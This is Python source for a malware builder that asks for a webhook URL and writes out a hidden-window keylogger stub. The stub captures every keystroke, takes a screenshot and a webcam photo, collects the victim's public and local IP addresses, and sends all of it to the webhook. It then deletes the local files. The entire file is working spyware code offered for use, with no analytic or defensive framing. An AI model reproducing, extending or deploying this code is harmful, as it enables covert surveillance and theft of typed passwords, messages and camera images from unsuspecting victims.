import os

class keylogger:
    def __init__(self):
        pass
    def run(self):
        mlwr_folder = "Malicous_builds"
        os.makedirs(mlwr_folder, exist_ok=True)
        filename = os.path.join(mlwr_folder, "keylogger.pyw")
        print("Program is asking for a webhook")
        self.webhook_raw = input("console//: ")
        webhook = self.webhook_raw.strip()
        with open(filename, "w") as f:
            stub = f"""
import aiohttp
from pynput import keyboard
import asyncio
import pyautogui
import os
import cv2
import socket
import requests
import shutil

folder = "contents"
os.makedirs(folder, exist_ok=True)

class KeyLogger:
    def __init__(self):
        self.text = ""
        self.json = None

    async def start(self):
        async with aiohttp.ClientSession() as self.sack:
            async with self.sack.post("{webhook}", json=self.json):
                pass

    async def send_data(self):
            self.json = {{"content": f"{{self.text}}"}}
            await self.start()
            
    async def send_loop(self):
        while True:
            if self.text:
                await self.send_data()
                self.text = ""
            await asyncio.sleep(10)
                                
    def on_press(self, key):
        try:
            self.text += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.enter:
                self.text += "\\n"
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.tab:
                self.text += "\\t"
            elif key == keyboard.Key.backspace:
                if len(self.text) > 0:
                    self.text = self.text[:-1]
                else:
                    pass
            else:
                self.text += f"\\n{{key}}"
        except None:
            pass
            

    async def run(self):
        requests.post("{webhook}", json={{"content": "Keylogger started successfully."}})
        with keyboard.Listener(on_press=self.on_press):
            await self.send_loop()

def take_screenshot():
    filename = os.path.join(folder, "screenshot.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def camera_capture():
    if not cv2.VideoCapture(0).isOpened():
        return None
    filename = os.path.join(folder, "camera_capture.png")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(filename, frame)
    cam.release()
    return filename

def send_data_dc():
    async def start():
        screenshot  = take_screenshot()
        camera_img = camera_capture()
        media = [screenshot, camera_img]
        public_ip, local_ip = ip_grabber()
        ip_msg = f"Public IP >> {{public_ip}}\\nLocal IP >> {{local_ip}}"
        ip_msg_payload = {{
            "content": f"```{{ip_msg}}```"
        }}
        async with aiohttp.ClientSession() as sack:
            webhook_url = "{webhook}"
            for file_path in media:
                if file_path and os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        form = aiohttp.FormData()
                        form.add_field('file', f, filename=os.path.basename(file_path))
                        await sack.post(webhook_url, data=form)
            await sack.post(webhook_url, json=ip_msg_payload)
            shutil.rmtree(folder)
    asyncio.run(start())

def ip_grabber():
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
    except Exception:
        public_ip = "None"
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "None"

    return public_ip, local_ip


if __name__ == '__main__':
    take_screenshot()
    camera_capture()
    ip_grabber()
    send_data_dc()
    keylogger = KeyLogger()
    asyncio.run(keylogger.run())

"""
            f.write(stub)
            input(f"Keylogger created at {filename}... Press Enter to continue...")